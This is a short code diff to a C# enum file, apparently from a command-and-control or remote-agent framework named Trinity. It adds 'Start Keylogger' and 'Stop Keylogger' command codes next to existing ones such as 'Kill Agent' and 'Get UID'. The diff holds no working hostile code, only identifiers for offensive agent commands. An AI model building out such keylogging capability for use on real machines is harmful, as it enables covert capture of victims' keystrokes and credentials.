@@ -44,7 +44,11 @@ namespace Trinity.Shared.Enums
         [EnumMember(Value = "Kill Agent")]
         KillAgent = 0x0016,
         [EnumMember(Value = "Get UID")]
-        GetUID = 0x0017
+        GetUID = 0x0017,
+        [EnumMember(Value = "Start Keylogger")]
+        StartLogger = 0x0018,
+        [EnumMember(Value = "Stop Keylogger")]
+        StopLogger = 0x0019
 
     }
 }
